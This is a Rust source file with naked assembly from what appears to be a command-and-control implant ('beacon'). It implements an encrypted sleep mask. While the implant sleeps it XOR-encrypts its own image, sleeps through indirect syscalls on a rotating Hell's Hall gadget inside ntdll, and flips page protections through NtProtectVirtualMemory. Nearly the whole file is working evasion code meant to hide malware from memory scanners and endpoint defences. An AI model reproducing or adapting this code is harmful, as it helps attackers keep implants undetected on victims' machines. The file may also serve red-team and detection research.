//! Encrypted sleep mask: the self-contained sleep stub (port of the
//! original project's sleepmask NASM blob, in Rust naked asm).
//!
//! While the beacon sleeps, its whole image is encrypted with a
//! byte-oriented xorshift64 keystream — except the stub's own window,
//! which must stay plaintext to decrypt on wake. The stub:
//!
//! 1. encrypts `[img_base, stub_start)` then `[stub_end, img_end)`;
//! 2. sleeps through `NtDelayExecution` via an indirect syscall on a
//!    Hell's Hall gadget (the `syscall` instruction never runs from beacon
//!    memory, and the gadget rotates per cycle — the caller refreshes the
//!    `gadget` field of the parameter block before every call);
//! 3. regenerates the keystream from the same seed and re-runs both
//!    ranges (XOR with the identical stream decrypts);
//! 4. returns; the beacon resumes with its image intact.
//!
//! Every address comes from the `SleepMaskParams` block (stack-resident,
//! never encrypted) — the asm contains no absolute references, keeping the
//! blob position-independent (the double-base CI proof enforces it).
//!
//! Same exposure window as the original: the VEH handler is inside the
//! encrypted ranges, so an exception on a foreign thread during the sleep
//! window would execute ciphertext — the hooks are armed only on the
//! beacon's own thread, which is inside the syscall for the whole window.

use core::arch::naked_asm;

use specter_core::sleepmask::SleepMaskParams;

/// Execute-and-write protection: the bootstrap probe must keep the
/// probed page executable (live code runs there); the sleep stub's own
/// range flips hardcode 0x04 in the naked asm (nothing executes from
/// the encrypted ranges during the window).
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

/// The encrypted-sleep stub.
///
/// RX-mapped payloads (RustPacker sets PAGE_EXECUTE_READ) cannot be
/// written to: the stub flips its two encrypted ranges RW through
/// `NtProtectVirtualMemory` before the keystream and restores the
/// original protection after the decrypt. The stub's own window never
/// changes protection — it stays executable for the whole flow.
///
/// # Safety
///
/// The parameter block must be stack-resident (never encrypted) and fully
/// initialized: valid image bounds containing this stub, the SSNs of
/// `NtDelayExecution` and `NtProtectVirtualMemory`, a live gadget and the
/// image's original protection.
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
    naked_asm!(
        // ---- prologue: save everything the stub uses -----------------
        "push rbx",
        "push rbp",
        "push rdi",
        "push rsi",
        "push r12",
        "push r13",
        "push r14",
        "push r15",
        "sub  rsp, 0x38", // shadow space + locals (interval, flip block)
        "mov  r15, rcx",  // r15 = params (survives everything)
        // load the fields once
        "mov  rbx, [r15 + 0x00]", // img_base  -> cur
        "mov  rdi, [r15 + 0x08]", // img_end
        "mov  rsi, [r15 + 0x10]", // stub_start
        "mov  r12, [r15 + 0x18]", // stub_end
        "mov  eax, [r15 + 0x28]", // ssn (u32)
        "mov  r13, [r15 + 0x30]", // gadget
        "mov  r14, [r15 + 0x38]", // interval
        "mov  rax, [r15 + 0x20]", // keystream seed
        // ---- flip both encrypted ranges writable (RX payloads) --------
        // Locals for NtProtectVirtualMemory: [rsp+0x00] = base (in/out),
        // [rsp+0x08] = region size (u64, in/out), [rsp+0x10] = old (out),
        // [rsp+0x20] = fifth-argument slot (written per call).
        // Range 1: [img_base, stub_start).
        "mov  [rsp], rbx",
        "mov  rcx, rsi",
        "sub  rcx, rbx",
        "mov  [rsp + 0x08], rcx",
        "mov  rcx, -1", // NtCurrentProcess()
        "lea  rdx, [rsp]",
        "lea  r8,  [rsp + 0x08]",
        "mov  r9d, 0x04", // PAGE_READWRITE
        "lea  rbp, [rsp + 0x10]",
        "mov  [rsp + 0x20], rbp", // OldProtect*
        "mov  r10, rcx",
        "mov  eax, [r15 + 0x40]", // NtProtectVirtualMemory SSN
        "call r13",
        // Range 2: [stub_end, img_end).
        "mov  [rsp], r12",
        "mov  rcx, rdi",
        "sub  rcx, r12",
        "mov  [rsp + 0x08], rcx",
        "mov  rcx, -1",
        "lea  rdx, [rsp]",
        "lea  r8,  [rsp + 0x08]",
        "mov  r9d, 0x04",
        "lea  rbp, [rsp + 0x10]",
        "mov  [rsp + 0x20], rbp",
        "mov  r10, rcx",
        "mov  eax, [r15 + 0x40]",
        "call r13",
        // ---- encrypt range 1: [img_base, stub_start) ----------------
        "1:",
        "cmp  rbx, rsi",
        "jae  2f",
        "xor  byte ptr [rbx], al",
        "inc  rbx",
        // keystream: xorshift64, one byte per step (same stream on decrypt)
        "mov  rdx, rax",
        "shl  rdx, 13",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shr  rdx, 7",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shl  rdx, 17",
        "xor  rax, rdx",
        "shr  rax, 8",
        "jmp  1b",
        // ---- encrypt range 2: [stub_end, img_end) --------------------
        "2:",
        "mov  rbx, r12",
        "3:",
        "cmp  rbx, rdi",
        "jae  4f",
        "xor  byte ptr [rbx], al",
        "inc  rbx",
        "mov  rdx, rax",
        "shl  rdx, 13",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shr  rdx, 7",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shl  rdx, 17",
        "xor  rax, rdx",
        "shr  rax, 8",
        "jmp  3b",
        // ---- sleep: NtDelayExecution(FALSE, &interval) ----------------
        "4:",
        "mov  [rsp], r14",        // local interval
        "xor  ecx, ecx",          // Alertable = FALSE
        "mov  rdx, rsp",          // &interval
        "mov  r10, rcx",          // syscall ABI: arg1 -> r10
        "mov  eax, [r15 + 0x28]", // SSN
        "mov  r11, r13",          // gadget: syscall; ret in ntdll
        "call r11",
        // ---- decrypt: regenerate the identical stream -----------------
        "mov  rax, [r15 + 0x20]", // same seed
        "mov  rbx, [r15 + 0x00]", // img_base
        "mov  rdi, [r15 + 0x08]", // img_end
        "mov  rsi, [r15 + 0x10]", // stub_start
        "mov  r12, [r15 + 0x18]", // stub_end
        "5:",
        "cmp  rbx, rsi",
        "jae  6f",
        "xor  byte ptr [rbx], al",
        "inc  rbx",
        "mov  rdx, rax",
        "shl  rdx, 13",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shr  rdx, 7",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shl  rdx, 17",
        "xor  rax, rdx",
        "shr  rax, 8",
        "jmp  5b",
        "6:",
        "mov  rbx, r12",
        "7:",
        "cmp  rbx, rdi",
        "jae  8f",
        "xor  byte ptr [rbx], al",
        "inc  rbx",
        "mov  rdx, rax",
        "shl  rdx, 13",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shr  rdx, 7",
        "xor  rax, rdx",
        "mov  rdx, rax",
        "shl  rdx, 17",
        "xor  rax, rdx",
        "shr  rax, 8",
        "jmp  7b",
        // ---- epilogue -------------------------------------------------
        // ---- restore the original protection -------------------------
        "8:",
        // Range 1: [img_base, stub_start).
        "mov  rbx, [r15 + 0x00]",
        "mov  [rsp], rbx",
        "mov  rcx, rsi",
        "sub  rcx, rbx",
        "mov  [rsp + 0x08], rcx",
        "mov  rcx, -1",
        "lea  rdx, [rsp]",
        "lea  r8,  [rsp + 0x08]",
        "mov  r9d, [r15 + 0x44]", // original protection
        "lea  rbp, [rsp + 0x10]",
        "mov  [rsp + 0x20], rbp",
        "mov  r10, rcx",
        "mov  eax, [r15 + 0x40]",
        "call r13",
        // Range 2: [stub_end, img_end).
        "mov  [rsp], r12",
        "mov  rcx, rdi",
        "sub  rcx, r12",
        "mov  [rsp + 0x08], rcx",
        "mov  rcx, -1",
        "lea  rdx, [rsp]",
        "lea  r8,  [rsp + 0x08]",
        "mov  r9d, [r15 + 0x44]",
        "lea  rbp, [rsp + 0x10]",
        "mov  [rsp + 0x20], rbp",
        "mov  r10, rcx",
        "mov  eax, [r15 + 0x40]",
        "call r13",
        // ---- epilogue -----------------------------------------------
        "9:",
        "add  rsp, 0x38",
        "pop  r15",
        "pop  r14",
        "pop  r13",
        "pop  r12",
        "pop  rsi",
        "pop  rdi",
        "pop  rbp",
        "pop  rbx",
        "ret",
        // stub end marker: the mask keeps [stub_start, stub_end) plaintext;
        // discovered at bootstrap by a bounded scan for these 8 bytes.
        ".quad 0x00000000CAFEBABE",
    );
}

/// Compute the static parts of the parameter block at bootstrap: the stub's
/// own window, the image bounds, the `NtProtectVirtualMemory` SSN and the
/// image's original protection (probed on the harmless tail page — the
/// mask writes to its own image, which an RX-mapped payload forbids).
/// `None` disables the mask (the beacon falls back to the plain indirect
/// sleep).
///
/// # Safety
///
/// The stub must be part of the mapped, page-aligned beacon image (the
/// caller passes its own address as the hint); `ntdll` a mapped ntdll and
/// `gadget` a live `syscall; ret` address inside it.
pub unsafe fn build_params(
    ntdll: *mut core::ffi::c_void,
    gadget: *const core::ffi::c_void,
    dbg: isize,
) -> Option<SleepMaskParams> {
    let stub_start = spt_sleepmask as *const () as usize;
    // The image base: walk pages down from the stub's own address.
    let img_base = specter_core::sleepmask::find_image_base(stub_start, 0x1000, 64)?;
    // The stub end: bounded scan for the marker after the code.
    let stub_end = specter_core::sleepmask::find_marker(
        stub_start,
        0x400,
        &specter_core::sleepmask::STUB_END_MAGIC,
    )?;
    // The image end: bounded scan for the SPT_END marker.
    let img_end_marker = specter_core::sleepmask::find_marker(
        img_base,
        0x20000,
        &specter_core::sleepmask::IMAGE_END_MAGIC,
    )?;
    let img_end = img_end_marker + 8;
    if img_end <= stub_end || stub_start < img_base || stub_end <= stub_start {
        return None; // inconsistent bounds: refuse to encrypt anything
    }
    crate::runtime::debug::log_handle(dbg, b"sm: bounds\n");
    let protect_ssn = crate::runtime::syscalls::protect_virtmem_ssn(ntdll)?;
    crate::runtime::debug::log_handle(dbg, b"sm: ssn\n");

    // Probe the image's original protection on the tail page (nothing
    // executes there): flip it writable, capture, restore. A payload
    // whose pages cannot be flipped (e.g. COW-mapped file sections)
    // refuses the mask instead of crashing at sleep time.
    let mut probe_base = img_end - 0x1000;
    let mut probe_size: u64 = 0x1000;
    let mut orig: u32 = 0;
    // The probe flips the tail page RWX, never RW: the tail page holds
    // live code (the -Oz layout puts the mask stage near the end of
    // .text), and a non-executable flip faults the very next
    // instruction of the caller (observed as 0xC0000005 on the real VM).
    crate::runtime::debug::log_handle(dbg, b"sm: probe1\n");
    let st = crate::runtime::syscalls::indirect_syscall5(
        protect_ssn,
        gadget,
        -1isize as usize,
        &mut probe_base as *mut usize as usize,
        &mut probe_size as *mut u64 as usize,
        PAGE_EXECUTE_READWRITE as usize,
        &mut orig as *mut u32 as usize,
    );
    if st != 0 {
        return None;
    }
    crate::runtime::debug::log_handle(dbg, b"sm: probe\n");
    let mut dummy: u32 = 0;
    crate::runtime::debug::log_handle(dbg, b"sm: probe2\n");
    let st = crate::runtime::syscalls::indirect_syscall5(
        protect_ssn,
        gadget,
        -1isize as usize,
        &mut probe_base as *mut usize as usize,
        &mut probe_size as *mut u64 as usize,
        orig as usize,
        &mut dummy as *mut u32 as usize,
    );
    if st != 0 {
        return None;
    }

    Some(SleepMaskParams {
        img_base,
        img_end,
        stub_start,
        stub_end,
        seed: 0,
        ssn: 0,
        _pad: 0,
        gadget: 0,
        interval: 0,
        protect_ssn,
        orig_protect: orig,
    })
}
